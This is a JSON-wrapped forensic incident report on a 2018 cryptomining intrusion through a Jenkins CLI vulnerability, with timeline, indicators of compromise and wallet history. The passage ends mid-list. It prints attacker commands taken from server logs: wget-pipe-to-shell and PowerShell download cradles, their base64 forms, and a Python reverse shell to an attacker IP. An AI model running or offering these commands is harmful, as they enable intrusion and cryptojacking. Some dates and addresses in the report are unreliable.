{
    "id": "09935e8b-1269-432c-8b87-67dc350ba88a",
    "created_at": "2022-10-25T16:48:21.395297Z",
    "updated_at": "2025-03-27T02:09:29.699656Z",
    "deleted_at": null,
    "sha1_hash": "440a9f2f686b8b951b78f0574ddd53329c9b531b",
    "title": "",
    "authors": "",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 1209266,
    "plain_text": "-----\n\n# Executive Summary\n\nThis report describes the discovery and analysis of a security breach in a web server of one of\nour partner organizations on February 2018. The analysis revealed a long pattern of attacks\nagainst several web servers in the same organization which intended to use the compromised\nserver for cryptomining purposes.\n\nThe attackers exploited a known vulnerability in Jenkins and Apache web server. After\nexploitation, the attackers attempted to download and execute a Monero cryptocurrency\nmining malware in the compromised system. These attacks aimed to take advantage of the\ncomputational power available on the organization for mining cryptocurrency. The attacks did\nnot specifically target the organization.\n\nThe attacks were first found around mid 2017 and there are several descriptions of their\nactivities. However, there has not been so far a ​complete description of the methodologies,\ntools, infrastructure and possible scope of the threat.\n\nOur team inspected historical application logs, network traffic from hundred of servers and the\nactual malicious files to better understand the attack. We uncovered several unknown details\nof the attacks that are useful to better understand the threat. The attacks in the organization’s\nservers date back to mid 2017 and the attackers repeated them every few months.\n\nAlthough the cryptocurrency mining malware is not new to the security community, a ​change\n**has been witnessed in the techniques and exploits used to gain control of servers. The**\nsame malware adapts to use different and new exploits, can infect different operating systems,\nand has a large capability to find vulnerable servers. We concluded that the ​threat is\n**significant, and it has a large and complex background infrastructure. Moreover, the​**\ncryptocurrency wallet used in this attack was previously used in other attacks, suggesting that\nthe attackers were from the same group. The wallet is well known to the community, blocking it\nto receive and send payouts in several cryptocurrency sites. An analysis of this wallet is\nperformed.\n\nWe conclude that cryptomining attacks are a real and large threat to the Internet, obtaining\nhundreds of thousands of dollars per wallet and putting at risk the operation of millions of\nservers. These attacks seem to be part of a large infrastructure of malicious activities and not\nisolated cases. The time, money, servers and amount of code needed to maintain the operation\nis large enough to justify a deeper analysis.\n\n\n-----\n\n# Contents\n\n**Executive Summary** **2**\n\n**Contents** **3**\n\n**Discovery and Vulnerability** **4**\n\nIncident discovery 4\n\nDetails of the exploited vulnerability 5\n\n**Forensic Analysis** **5**\n\nApache logs 6\n\nTomcat logs 6\n\nAnalysis of the malicious shell script 8\n\nBash script logo4.jpg 8\n\n**Infrastructure of the Attack** **12**\n\n**Timeline of the Attack on Nora** **14**\n\n**Indicators of Compromise** **15**\n\nAttackers Source IPs 15\n\nShell Scripts 17\n\nCrypto miners and Configuration Files 17\n\n**Response from the Community and Countermeasures** **19**\n\n**Related Attacks and Educational Environments** **19**\n\n**Conclusions** **23**\n\n**References** **24**\n\n**Appendix A: Information on malware sample 4fa4269b7ce44bfce5ef574e6a37c38f** **26**\n\nMalware identification 26\n\nMalware reports 26\n\n**Appendix B: YARA rules for miner detections** **28**\n\n\n-----\n\n# Discovery and Vulnerability\n\n## Incident discovery\n\nOn ​February 19th, 2018, around 12:00 CET, the CivilSphere team received an alert from the​\nsystem administrator of one of our partner organizations. A web server, named Nora, was​\ndisplaying unusual behavior that suggest an ongoing intrusion attack. The alert was triggered\nafter receiving an automated email from the ​c​ron daemon indicating that there was a task\ntrying to stop certain processes but didn’t have the permissions to do so. The email looked like\nthis:\n\n**From: root <system-messages@xxx.yyy.zzz>**\n**To: \"tomcat6\"**\n**Cc:**\n**Bcc:**\n**Date: Mon, 19 Feb 2018 12:21:02 +0100**\n**Subject: Cron <tomcat6@xxx> wget -q http://192.99.142.232:8220/logo4.jpg -O - | sh**\n**pkill: killing pid 2271 failed: Operation not permitted**\n**pkill: killing pid 1774 failed: Operation not permitted**\n**pkill: killing pid 2271 failed: Operation not permitted**\n\nThe email alert had enough information to start investigating. The subject alone was a strong\nindication that something suspicious was occurring. There was an unauthorized task in the\n_crontab that was attempting to download a file called “logo4.jpg​_ ” from the IP​ ​192.99.142.232,\nand then trying to execute it.\n\nOur team downloaded this file in a safe environment to examine it. The file was a shell script\nthat executed several instructions. These included commands to:\n\n  - Kill a fixed list of processes. Possibly to delete previous versions of itself or other\ncompeting processes.\n\n  - Add itself to the crontab​ in order to have persistence in the server. ​\n\n  - Download two files, a binary file and a JSON file. The script is designed to attempt\ndifferent downloads in case the first download fails (see SubSection ‘Analysis of the\nmalicious shell script’ for the full functionality of this script). In this case, the first\ndownload attempt failed, but the second one was successful:\n\n\n-----\n\na. First it tried to download a first pair of files: ​gcc and ​config_1.json. Files were​\nstored in /var/tmp/ folder as ​supsplk and ​config.json respectively.This attempt\nfailed.\nb. Since the first attempt failed, the script tried to download a second pair of files:\n**_minerd ​and ​c1.json ​files. Files were stored in /var/tmp/ folder as ​supsplk and_**\n**_config.json respectively. This attempt was successful. ​_**\n\n  - Execute the binary file using the JSON file as a configuration file.\n\n  - Start mining cryptocurrency.\n\nThe analysis of the script and the downloaded files confirmed that we were dealing with a\ncryptomining attack. Inside the server, the team discovered the binary file called ​supsplk ​(ELF\n64-bit LSB executable). According to VirusTotal, this file is likely malicious and categorized as a​\nLinux ELF64 EXEC [8]. In order to get more information, the team also downloaded the\n**_config.json file used by ​supsplk. This file had credentials for the monero cryptocurrency wallet​_**\nusing the monerohash.com server.\n\n## Details of the exploited vulnerability\n\nAccording to our findings, the attacker exploited the **Jenkins​** **CLI** vulnerability\n(CVE-2017-1000353)​ in the attacked server, which provides unauthenticated remote code\nexecution. The vulnerability is described by the MITRE CVE dictionary as follows:\n\n“Jenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier are vulnerable to an unauthenticated​\n_remote code execution. An unauthenticated remote code execution vulnerability allowed attackers to_\n_transfer a serialized Java `SignedObject` object to the Jenkins CLI, that would be deserialized using a new_\n_`ObjectInputStream`, bypassing the existing blacklist-based protection mechanism. We're fixing this issue_\n_by adding `SignedObject` to the blacklist. We're also backporting the new HTTP CLI protocol from_\n_Jenkins 2.54 to LTS 2.46.2, and deprecating the remoting-based (i.e. Java serialization) CLI protocol,_\n_disabling it by default.​” [5]_\n\nIn this case, the compromised server was running Jenkins 1.532.2, a very old version of the\nsoftware. The vulnerability was announced by the Jenkins team on May 26th, 2017.\n\nIn newer versions of Jenkins, the remote-based CLI was deprecated, introducing a new one\nbased in HTTP, in addition to an existing one that uses SSH. The Jenkins team recommends\nto disable the use of the former and use any of the latter instead.\n\n# Forensic Analysis\n\nFortunately, the CivilSphere team had access to the complete logs of the infected server as\nwell as its historical network traffic. To better understand how the attacker got inside the server\n\n\n-----\n\nand pinpoint its entry point, we started by checking the logs of services which were running\nwith Apache/Tomcat and Jenkins users.\n\n## Apache logs\n\nThe following logs were extracted from the Apache web server at the moment of the attack. It\ncan be seen that the Jenkins application was targeted, and that the attack came from the IP\naddress 192.99.142.227​ . ​\n\n**192.99.142.227 - [19/Feb/2018:12:04:01 +0100] \"POST /jenkins/cli HTTP/1.1\" 200 2670 \"-\"**\n**192.99.142.227 - [19/Feb/2018:12:04:02 +0100] \"POST /jenkins/cli HTTP/1.1\" 200 213 \"-\"**\n**192.99.142.227 - [19/Feb/2018:12:04:03 +0100] \"POST /jenkins/cli HTTP/1.1\" 200 2670 \"-\"**\n**192.99.142.227 - [19/Feb/2018:12:04:04 +0100] \"POST /jenkins/cli HTTP/1.1\" 200 213 \"-\"**\n**192.99.142.227 - [19/Feb/2018:12:04:05 +0100] \"POST /jenkins/cli HTTP/1.1\" 200 2670 \"-\"**\n**192.99.142.227 - [19/Feb/2018:12:04:06 +0100] \"POST /jenkins/cli HTTP/1.1\" 200 213 \"-\"**\n\nThese logs were obtained from the attacked server and later on, this activity was verified with\nour external network capture. These logs gave us the first indication on how the attack worked.\n\n## Tomcat logs\n\nLooking at the Tomcat logs of the infected server it was possible to see the exact sequence of\nattacks. The first successful command to download and execute a malicious script was found\nin the Tomcat logs on Feb 19, 2018 at 12:04:04​, as seen below: ​\n\n**Feb 19, 2018 12:04:04 PM - hudson.remoting.SynchronousCommandTransport$ReaderThread run**\n**SEVERE: I/O error in channel HTTP full-duplex channel**\n**9763bad9-c57a-4b5d-9eeb-faca755efad0**\n**hudson.remoting.DiagnosedStreamCorruptionException**\n**...**\n**'mbash -c**\n**{echo,d2dldCAtcSBodHRwOi8vMTkyLjk5LjE0Mi4yMzI6ODIyMC9sb2dvNC5qcGcgLU8gLSB8IHNo}|{base64**\n**,-d}|{bash,-i}t'**\n**...**\n\nThe string in that log is encoded in Base64:\n\n**d2dldCAtcSBodHRwOi8vMTkyLjk5LjE0Mi4yMzI6ODIyMC9sb2dvNC5qcGcgLU8gLSB8IHNo**\n\nDecoding the string shows the instruction to download and execute a malicious shell script:\n\n**wget -q http://192.99.142.232:8220/logo4.jpg -O - | sh**\n\nThis was the successful attack that infected the Nora server.\n\n\n-----\n\nThere was a second command observed in the Tomcat logs that attempted to download and\nexecute a malicious script, this time for Windows. The attempt was performed on ​Feb 19, 2018\n**at 12:04:06, as it can be read below: ​**\n\n**Feb 19, 2018 12:04:06 PM - hudson.remoting.SynchronousCommandTransport$ReaderThread run**\n**SEVERE: I/O error in channel HTTP full-duplex channel**\n**dd599c96-9e2f-4f5d-a69a-f781b2476d1c**\n**hudson.remoting.DiagnosedStreamCorruptionException**\n**...**\n**'*powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc**\n**cABvAHcAZQByAHMAaABlAGwAbAAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGU**\n**AYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAD**\n**EANQA4AC4ANgA5AC4AMQAzADMALgAxADcAOgA4ADIAMgAwAC8AMQAuAHAAcwAxACcAKQA=t'**\n**...**\n\nThe string in that log is encoded in Base64:\n\n**cABvAHcAZQByAHMAaABlAGwAbAAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGU**\n**AYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAD**\n**EANQA4AC4ANgA5AC4AMQAzADMALgAxADcAOgA4ADIAMgAwAC8AMQAuAHAAcwAxACcAKQA=**\n\nDecoding the string shows the instruction to download and execute a malicious shell script but\nfor Windows:\n\n**Base64 decode: powershell IEX (New-Object**\n**Net.WebClient).DownloadString('http://158.69.133.17:8220/1.ps1')**\n\nOther attacks were found in the Tomcat logs, most of them from last year. These dates are\nconsistent with the announcement of the Jenkins vulnerability on May 2017. One of the first\nattempts was made on June 2017 and it was a request to ​http://218.161.13.248/1.txt (not\naccessible now). Another attempt worth considering was in September 2017, which sent a\nrequest to the Jenkins CLI with the following content:\n\nSep 13, 2017 3:45:09 PM hudson.remoting.SynchronousCommandTransport$ReaderThread run\nSEVERE: I/O error in channel HTTP full-duplex channel\n64e64e99-7e68-433a-8280-3994d261137c\nhudson.remoting.DiagnosedStreamCorruptionException\n...\n/bin/basht' 0x00 0x02 '-ct' 0x00 0xe5 'python -c 'import ​\n**_socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"91._**\n**_232.125.211\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);_**\n**_os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]) ​_**\n\nThe bold and italic text is a classic method to obtain a ​reverse shell to bypass firewall\nprotections. This command would make a connection from the server to the attacker instead of\nthe attacker to the server, and it is usually a connection with the ability to run system\n\n\n-----\n\ncommands. In this case the attacker IP address was ​91.232.125.211. Some of these attacks​\nwere successful, but it is difficult to be completely certain after half a year.\n\n## Analysis of the malicious shell script\n\nThe attack on the server consisted of a bash script, used for checking running processes, new\nversions of the script, and download of miner executables for Linux. Below you will find a\ndetailed analysis of the files involved in this attack.\n\n## Bash script logo4.jpg\n\n[This bash script, with MD5 ​b413478091f9fa96ad88cbe57cde3d5b, was downloaded directly​](https://www.virustotal.com/#/file/b413478091f9fa96ad88cbe57cde3d5b)\nfrom the code executed by the exploit. The script is very generic and it takes care of\ndownloading and updating itself using the ​cron service. ​At the moment of detection, this\n**malicious file was not uploaded to the VirusTotal service1 .**\n\n1 https://www.virustotal.com/#/file/b413478091f9fa96ad88cbe57cde3d5b ​\n\n\n-----\n\nThe file is a Linux/Unix shell script that contains 369 lines of code. A total of 298 lines of code\nare dedicated to kill existing processes using different methods: killing through specific\nprocess names, removing specific known malicious files from the system, and searching for\nkeywords or PIDs. The first 20 lines of the script are shown below, and they show how the\nauthors of the script attempted to kill not only previously existing versions of the same script,\nbut also other possible cryptocurrency miners that have compromised the server previously.\nThe script used pkill​ ​, which allows to kill processes by name.\n\n**#!/bin/sh**\n**pkill -9 142.4.124.164**\n**pkill -9 192.99.56.117**\n**pkill -f 67.231.243.10**\n**pkill -9 jva**\n**pkill -f ./atd**\n**pkill -f /tmp/wa/httpd.conf**\n**pkill -f 108.61.186.224**\n**pkill -f 128.199.86.57**\n**pkill -f 142.4.124.164**\n**pkill -f 192.99.56.117**\n**pkill -f 45.76.102.45**\n**pkill -f AnXqV.yam**\n**pkill -f BI5zj**\n**pkill -f Carbon**\n**pkill -f Duck.sh**\n**pkill -f Guard.sh**\n**pkill -f JnKihGjn**\n**pkill -f KGlJwfWDbCPnvwEJupeivI1FXsSptuyh**\n**pkill -f NXLAi**\n\nAfter the first batch of instructions to kill processes, the script creates a new job in the ​crontab\nto download a new version of the script periodically. The script removes existing ​cron jobs in\nthe ​crontab first, then creates a new ​crontab instruction and stores it as a temporary file. The\ntemporary file is used to write the new crontab​ ​ instruction and is deleted afterwards.\n\nThe next section of the script attempts to pause two docker processes if they are running:\n**_kube-apis and ​nginx78​. The malware then downloads a new version of the configuration file_**\nand cryptomining malware, and runs it after calculating the number of cores in the server and\nnumber of pages that will be reserved.\n\n\n-----\n\n_First if-then section: Download of gcc._\n\nThe remaining sections of the code can be split in “if - else” sections. In each section, the\nmalicious script will check if the last command exited successfully or not. If it didn’t, the\nmalware will proceed to download a new configuration and/or cryptominer version, it will\ncalculate the number of cores and reserved pages, and the miner is run again.\n\n_Second if-then section: Download of minerd. This is the one that was successful in the attack of the Nora_\n_server._\n\n_Third if-then section: Download of atd2._\n\n\n-----\n\n_Fourth if-then section: Download of atd3._\n\n_Fifth if-then section: Download of yam._\n\nNotice that the downloaded resources are different. More details about these miners are\nincluded in the IoC​ section. The following is a summary of all the downloads in the if-then\nsections of the script:\n\n  - First download: http://192.99.142[.]232:8220/gcc\n\n  - Second download: http://192.99.142[.]232:8220/minerd\n\n**○** **This is the miner that was successfully executed in the server.**\n\n  - Third download: http://192.99.142[.]232:8220/atd2\n\n  - Fourth download: http://192.99.142[.]232:8220/atd3\n\n  - Fifth download: http://192.99.142[.]232:8220/yam\n\n**The JSON configuration file**\n\nThe malicious script also downloaded a configuration file. This configuration contains all the\nparameters that the crypto miner needs to run properly. This includes the algorithm, wallet\naddress, password (never used), and other settings. An example of the configuration file can be\nseen below:\n\n\n-----\n\n**{**\n**\"algo\": \"cryptonight\",**\n**\"av\": 0,**\n**\"colors\": true,**\n**\"cpu-affinity\": null,**\n**\"cpu-priority\": null,**\n**\"donate-level\": 0,**\n**\"log-file\": null,**\n**\"max-cpu-usage\": 90,**\n**\"print-time\": 60,**\n**\"safe\": false,**\n**\"url\": \"stratum+tcp://monerohash.com:5555\",**\n**\"user\":**\n**\"41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKX**\n**pm3zKTUYo\",**\n**\"pass\": \"x\",**\n**\"keepalive\": true,**\n**\"nicehash\": false**\n**}**\n\nIn this configuration file it can be seen that the miner uses the pool service ​monerohash.com\nwith the wallet:\n\n**41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xg**\n**Ui29TpKXpm3zKTUYo**\n\nThis monero wallet has already been known in the security community since last year,\nparticipating in a number of attacks and infections. See Section “Related Attacks and​\nEducational Environments“​ for more information about related attacks using this wallet. The\nconfiguration script also shows that the password used was ‘x’, however the mining service\ndoes not use a password, so this information was not used.\n\n# Infrastructure of the Attack\n\nAll the types of attacks reported on the Internet involving malware miners in the last year seem\nto have a very similar infrastructure that is driven by economic goals. They usually have three\nto four stages and at the end they execute a cryptocurrency miner. The mining software used\nfor the attacks doesn’t have to be new or even considered malicious. The malware used in the\nintrusion (MD5 4fa4269b7ce44bfce5ef574e6a37c38f​ ) was found and reported as malicious by​\nthe community since 2016. The fact that the miner is well known since 2016 does not stop\nfuture attacks easily since the script is quite easy to modify and adapt, and also because it is\nonly in the second stage. At the start of the intrusion, different vulnerabilities are exploited to\ngain access to the attacked system.\n\n\n-----\n\nThe complete schema of the infrastructure of the attack can be seen in Figure 1. The\ninfrastructure is significant from the point of view that the IP address used for attacking our\nserver and the IP address used for C&C belong to the same range ​192.99.142.0/24. In​\nparticular that IP range belongs to ​OVH Hosting, Inc. Since there are no known services or\norganizations registered as owners of these IP addresses for legal purposes, we may conclude\nthat the IPs were probably rented as hosting services for the purpose of attacking.\n\nFigure 1. Schema of the infrastructure of the attack that resulted in the installation of the Linux\n\nBitcoin Miner 4fa4269b7ce44bfce5ef574e6a37c38f.\n\n\n-----\n\n# Timeline of the Attack on Nora\n\nThe intrusion analyzed in this report was discovered in February 2018, however, there were\nidentical attacks happening months before in the ​same server. In this section we present a​\ngeneral timeline of events to better understand the attack and how it took place.\n\n**2017 Nov -> 2018 Feb - Jenkins Version installed in the server: 1.532.2 ​**\n**2017 Nov -> 2018 Feb - Apache Tomcat Version installed in the server 6.0.35 ​**\n\n**2017 Nov 06 - [from apache logs] Several attempts to POST /jenkins/cli (200 OK) ​**\n**2017 Nov 06 - [from tomcat logs] Two attempts to download and execute a malicious shell ​**\n**script (C&C IP address 142.4.124.50, port 8220, files logo4.jpg, logo3.jpg)**\n\n**2018 Jan 11 -> Feb 12 - [netflows] Repetitive connections from Nora to the malicious IP ​**\n**142.4.124.50, port 8220. The amount of connections attempts indicate that it may have**\n**been a malfunction on a previous version of the malware installed on the server. Dozens**\n**of requests per minute.**\n\n**2018 Feb 01 - [netflows] Received attacks attempts to several hosts in the University ​**\n**from the same attacker that attacked Nora. Attempts do not work.**\n\n**2018 Feb 12 - [tomcat logs] Attempt to download and execute a malicious shell script ​**\n**(ip 142.4.124.50, port 8220, files logo4.jpg).**\n\n**2018 Feb 19 12:04 - [apache logs] Successful access to Jenkins cli via POST requests ​**\n**from 192.99.142.227 (\"POST /jenkins/cli HTTP/1.1\" 200 OK).**\n\n**2018 Feb 19 12:04 - [tomcat logs] Download and execution of a malicious shell script ​**\n**(ip 142.4.124.50, port 8220, file logo4.jpg).**\n\n**2018 Feb 19 12:04 - [tomcat logs] Download and execution attempt of a malicious shell ​**\n**for Windows (ip 158.69.133.17, port 8220 file 1.ps1)**\n\n**2018 Feb 19 12:05 - [tomcat logs] Tomcat logs stopped. ​**\n\n**2018 Feb 19 12:21 - [system admin] Email received by the administration that a task in ​**\n**the system was attempting to kill a process but wasn’t authorized to do so.**\n\n**2018 Feb 19 13:22 - [apache logs] Logs indicate that Jenkins was down.​**\n\n\n-----\n\n# Indicators of Compromise\n\nBelow are the indicators, along with their sha256 hashes when applicable, extracted from the\nattack starting from the exploit → shell script → crypto miner. Also included are the alternative\ncrypto miner downloads, possible project sources, and wallet of the attacker.\n\n## Attackers Source IPs\n\n**●** **192.99.142.227 (Attacker)**\n**NetRange:    192.99.0.0 - 192.99.255.255**\n**CIDR:      192.99.0.0/16**\n**NetName:    OVH-ARIN-7**\n**NetHandle:   NET-192-99-0-0-1**\n**Parent:     NET192 (NET-192-0-0-0-0)**\n**NetType:    Direct Allocation**\n**OriginAS:    AS16276**\n**Organization:  OVH Hosting, Inc. (HO-2)**\n**RegDate:    2013-06-17**\n**Updated:    2013-06-17**\n**Comment:    www.ovh.com**\n**Ref:      https://whois.arin.net/rest/net/NET-192-99-0-0-1**\n\n**CustName:    Private Customer**\n**Address:    Private Residence**\n**City:      The Plains**\n**StateProv:   OH**\n**PostalCode:   45780**\n**Country:    US**\n**RegDate:    2017-12-12**\n**...<SNIP>...**\n\nThis seems to be a dynamic IP address which ISP is on Canada, but it was reselled to Ohio, US.\n\n  - **142.4.124.50 (Attacker)**\n**NetRange:    142.4.124.0 - 142.4.124.255**\n**CIDR:      142.4.124.0/24**\n**NetName:    199-180-100-0-1**\n**NetHandle:   NET-142-4-124-0-1**\n**Parent:     PT-82-4 (NET-142-4-96-0-1)**\n**NetType:    Reassigned**\n**OriginAS:    AS54600**\n**Customer:    Ryan koal (C03192641)**\n**RegDate:    2012-10-25**\n**Updated:    2012-10-25**\n**Ref:      https://whois.arin.net/rest/net/NET-142-4-124-0-1**\n\n\n-----\n\n**CustName:    [[REDACTED]]**\n**Address:    1376 Craigview Dr.**\n**City:      Chicago** **pittsburgh**\n**StateProv:   PA**\n**PostalCode:   15243**\n**Country:    US**\n**RegDate:    2012-10-25**\n**Updated:    2016-03-26**\n\n**●** **91.232.125.211 (Attacker)**\n**inetnum:    91.232.124.0 - 91.232.125.255**\n**netname:    CYBERHOSTPRO**\n**descr:     Cyber Host Pro LTD**\n**country:    GB**\n**org:      ORG-CHP2-RIPE**\n**admin-c:    CD3587-RIPE**\n**tech-c:     CD3587-RIPE**\n**status:     ASSIGNED PI**\n**mnt-by:     RIPE-NCC-END-MNT**\n**mnt-by:     GLOBALAXS-MNT**\n**mnt-routes:   GLOBALAXS-MNT**\n**mnt-domains:  GLOBALAXS-MNT**\n**notify:     samer@globalaxs.com**\n**created:    2011-11-09T13:31:35Z**\n**last-modified: 2016-06-09T14:47:28Z**\n**source:     RIPE**\n**sponsoring-org: ORG-GL37-RIPE**\n\n**organisation:  ORG-CHP2-RIPE**\n**org-name:    Cyber Host Pro Ltd**\n**org-type:    OTHER**\n**address:    Unit 36 Evans Business Centre**\n**address:    North Road**\n**address:    Ellesmere Port**\n**address:    Cheshire**\n**address:    CH65 1AE**\n**address:    United Kingdom**\n**e-mail:     ipabuse@cyberhostpro.com**\n**abuse-c:    AC30763-RIPE**\n**mnt-by:     OHT-MAINT**\n**mnt-ref:    OHT-MAINT**\n**created:    2009-02-21T17:53:39Z**\n**last-modified: 2016-02-15T17:03:24Z**\n**source:     RIPE**\n**...<SNIP>...**\n\nThis server belongs to a VPS server in the UK.\n\n\n-----\n\n## Shell Scripts\n\n**●** **http://218.161.13[.]248/1.txt**\n\n    - Used in June 2017 (inaccessible, likely same as the original shell script).\n\n    - Associated with HINET-NET, Data Communication Business Group, Taiwan.\n\n**●** **http://142.4.124[.]50:8220/logo4.jpg**\n\n    - Used in November 2017 (inaccessible, likely same as the original shell script).\n\n    - Associated with an physical person in Pittsburgh, United States.\n\n**●** **http://158.69.133[.]17:8220/1.ps1**\n\n    - Used on February 2018 (inaccessible, likely PowerShell version of the shell\nscript).\n\n    - a672a448cec76348d86c37c479a03dd0ba3ba142271d0aa3476298530204e295\n\n    - Associated with OVH Hosting, Inc., Canada.\n\n**●** **http://192.99.142[.]232:8220/logo4.jpg**\n\n    - Used in the successful february 2018 attack (POSIX shell script).\n\n    - 19c257223cc8dfee933d2ab8a647163683047e25e97f029a08d8fec7edb9a0b6\n\n    - Associated with OVH Hosting, Inc., Canada.\n\n## Crypto miners and Configuration Files\n\n**●** **http://192.99.142[.]232:8220/gcc**\n\n    - ELF 64-bit LSB executable, xmrig based miner.\n\n    - 8bf1def5479b39376b3790a83380831d288c57dd4fbad8e64abc3a9062eb56bb\n\n    - YARA: possible_cryptominer_xmrig\n\n    - Miner based on [https://github.com/xmrig/xmrig​](https://github.com/xmrig/xmrig) ​ due to hits on yara rule based\non the xmrig project.\n\n**●** **http://192.99.142[.]232:8220/c1.json**\n\n    - Configuration file for the xmrig miner.\n\n    - 8614f45af23b0b1d9b0d20296af4f2f6bd3a3a8f15b8e799f3e798bb8df850fa\n\n    - Wallet\n\n       - 41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRX\nWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo\n\n**●** **http://192.99.142[.]232:8220/minerd**\n\n    - ELF 64-bit LSB executable, minerd based miner.\n\n    - 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017\n\n    - YARA: possible_cryptominer_minerd.\n\n\n-----\n\n   - Miner based on [https://github.com/pooler/cpuminer​](https://github.com/pooler/cpuminer) due to hits on yara rule ​\nbased on cpuminer project.\n\n**●** **http://192.99.142[.]232:8220/kworker**\n\n   - Configuration file for bitcoin miner.\n\n   - 036aef71da7f7ff02591669bb180eb41a7de8f6830ab74ebf2fc1d6db1424d21\n\n   - Wallet\n\n      - 41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRX\nWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo\n\n**●** **http://192.99.142[.]232:8220/atd2**\n\n   - ELF 64-bit LSB executable, bitcoin miner likely based on cpuminer.\n\n   - 4811eab5b727d93309d8db651598d9e22bb7f87d385693efdda3576b9b2a56ad\n\n   - Possibly based on [https://github.com/pooler/cpuminer​](https://github.com/pooler/cpuminer) (version 2.3.3) due to the ​\nexecutable containing strings from the project, albeit inconclusively.\n\n**●** **http://192.99.142[.]232:8220/config_**\n\n   - Inaccessible but likely another miner configuration file.\n\n   - 31bae6f19b32b7bb7188dd4860040979cf6cee352d1135892d654a4df0df01c1\n\n   - Wallet\n\n      - 41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRX\nWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo\n\n**●** **http://192.99.142[.]232:8220/yam**\n\n   - ELF 64-bit LSB executable, likely based on cpuminer.\n\n   - 5bb66a5e9a7f6c76325a55b7a4a3128fc8631805676bbd3315ce2ac04ac2937b\n\n   - YARA: possible_cryptominer_minerd.\n\n   - Miner based on [https://github.com/pooler/cpuminer​](https://github.com/pooler/cpuminer) due to hits on yara rule ​\nbased on cpuminer project.\n\n**●** **http://192.99.142[.]232:8220/atd3**\n\n   - ELF 64-bit LSB executable, likely based on cpuminer.\n\n   - F4864b3793c93de50b953e9751dc22e03fa0333ae6856d8d153be9018da6d911\n\n   - [Possibly based from https://github.com/pooler/cpuminer​](https://github.com/pooler/cpuminer) ​ (version 2.3.3) due to\nthe executable containing strings from the project, albeit inconclusively.\n\n\n-----\n\n# Response from the Community and Countermeasures\n\nThe exact wallet used in this attack was reported for the first time in a Reddit channel [6] in\nJanuary 3rd, 2018 by the Reddit user ​fearsparks. An admin member of the monero pool where​\nthe wallet was reported (Reddit nickname M5M400), blocked the wallet address so it could not\nreceive payouts. Figure 2 shows the message of the administrator. Some minutes after the first\nblock the Reddit user ​xnbya reported that the wallet was also blocked in the servers of\nminexmr.com. ​Our attack was detected on February 19th, which may means one of two things:\nthat the attackers ​did not checked if the address was working in order to modify the malware\nand use a new address, or that they did changed the wallet in a new variant of the malware but\nthe old version was automatically being delivered more than one month later.\n\nFigure 2. Message on Reddit from an administrator of the Monero pool saying that the wallet\nused in the attack has been blocked. This happened more than one month before the attack\ninvestigated in this report.\n\nThe analysis, on January 3rd 2018, by Reddit user mg61456, was that the attacker was\ngenerating 174.51 KH per second, which is roughly $450 a day or $170k a year [6]. ​\n\nThe attacker was likely targeting random servers that were affected by the Jenkins\nvulnerability. The main goal for these type of attacks is to minimize the effort for the attacker\nand maximize the amount of compromised servers. A simple and effective ​countermeasure is\nto keep the ​software updated. In most cases, attackers won’t do extra work if servers are\nrunning up-to-date software. In this case the partner organization was running a web server\nwith a Jenkins version from 2014.\n\n# Related Attacks and Educational Environments\n\nIn February 2015, CheckPoint researchers warned about the active exploitation of the Jenkins\nvulnerability, CVE-2017-1000353, in what they claimed “One of the Biggest Mining Operations\nEver Discovered” [1]. In the report, researchers indicate that the cryptocurrency wallet used by\nthe attackers had already collected more than 3 million dollars [1].\n\n\n-----\n\nA Shell script with similar characteristics as the one mentioned in the section ‘Analysis of the\nmalicious shell script’ was mentioned in a report in December 2017 [3]. The Shell script is\ndifferent from the one we analyzed, but shows how at this stage, cryptomining attacks were\nalready on the rise.\n\nIn a security advisory by REN-ISAC [4], a series of attacks against Universities and Research\nInstitutions were reported. The attacks, which attempted to exploit vulnerabilities on Oracle\nWebLogic, have the final goal of running cryptomining malware. The TTPs described on the\nreport match what we have observed.\n\nThe Nora server was also part of an educational environment. In this context we found that the\neducational environment had 3 other attacked computers in the same 2 days when we\nanalyzed the compromise of the Nora Server. It is easy to understand why these type of\norganizations may be easily compromised and for longer periods of time. In the case of the\nNora server, it was running four years old software.\n\nSimilar attacks exploiting the same Oracle WebLogic vulnerability were reported, this time to\ndifferent types of organizations [6]. One of the Wallets described in the discussion is the same\nas the one mentioned in this report.\n\nIn February 2018, Trend Micro researchers reported active attacks against Apache CouchDB\n\n[2] exploiting two vulnerabilities, CVE-2017-12635 and CVE-2017-12636, which allow remote\ncommand execution and privilege escalation. After successful exploitation, the attackers would\ndownload a Shell Script used to launch cryptomining processes on the target.\n\nWe traced back the attacker’s activity by looking at other intrusions that used the same Wallet\nand discovered a long list which started mid 2017.\n\nThe timeline of attacks that used the same wallet is listed below: 2\n\n  - **Jun. 02, 2017: Exploited server running DC/OS Marathon software [9]. ​**\nThis is supposedly the first attack description using the monero wallet.\n\n  - **Jul. 18, 2017: Crypto miner attack abusing Redis in CentOS host [10]. ​**\n\n  - **Aug. 04, 2017: 